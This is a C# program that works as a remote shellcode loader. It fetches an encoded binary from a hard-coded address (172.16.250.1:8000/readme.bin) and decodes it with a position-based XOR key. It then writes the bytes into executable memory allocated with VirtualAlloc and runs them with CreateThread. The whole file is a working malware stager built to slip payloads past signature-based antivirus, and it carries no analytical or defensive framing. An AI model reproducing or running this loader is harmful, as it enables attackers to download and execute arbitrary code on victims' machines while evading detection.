using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Micro_wmices
{
    class Program
    {
        [DllImport("kernel32")] private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
        [DllImport("kernel32")] private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
        [DllImport("kernel32")] private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
        public Int32 genum(int i)
        {
            Int32 num = 0x21;
            int a = i % 10 + 1;
            num = num + a;
            return num;
        }
        public byte[] transfer(byte[] val)
        {
            //byte数组数据异或
            byte[] by = val;
            //Console.Write("异或前的byte数组转化成字符为："+Encoding.Default.GetString(by)+"\n");
            for (int i = 0; i < by.Length; i++)
            {
                //Console.Write("第" + (i + 1) + "个byte数据   " + by[i] + "    转换成字符前为" + (char)by[i] + "\n");
                by[i] = (byte)(by[i] ^ this.genum(i));
                //Console.Write("第" + (i + 1) + "个byte数据   " + by[i] + "    转换成字符后为" + (char)by[i] + "\n\n");
            }
            //Console.Write("异或后的byte数组转化成字符为：" + Encoding.Default.GetString(by)+"\n");

            return by;

        }
        public byte[] GetByte(string url)
        {   //获取远程二进制数据并将其转化为byte数组格式
            byte[] final_Byte;
            WebRequest req = WebRequest.Create(url);
            req.Method = "GET";
            using (WebResponse resp = req.GetResponse())
            {
                int length = (int)resp.ContentLength;
                Stream stream = resp.GetResponseStream();

                //读取到内存
                MemoryStream stmMemory = new MemoryStream();
                byte[] buffer1 = new byte[length];
                int i;

                //将字节逐个放入到Byte 中
                while ((i = stream.Read(buffer1, 0, buffer1.Length)) > 0)
                {
                    Console.WriteLine(i);
                    stmMemory.Write(buffer1, 0, i);
                }
                final_Byte = stmMemory.ToArray();
                stmMemory.Close();
            }
            return final_Byte;
        }
        static void Main(string[] args)
        {
            //string url = "http://172.16.250.1:8000/1.bin";
            string url = "http://172.16.250.1:8000/readme.bin";
            Program test = new Program();
            //byte[] by = new byte[] {0x45,0x46};
            byte[] by = test.GetByte(url);

            byte[] by2 = new byte[] { };
            by2 = test.transfer(by);

            Console.WriteLine(by2.Length);
            UInt32 funcAddr = VirtualAlloc(0, (UInt32)by2.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(by2, 0, (IntPtr)(funcAddr), by2.Length);
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;
            IntPtr pinfo = IntPtr.Zero;
            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
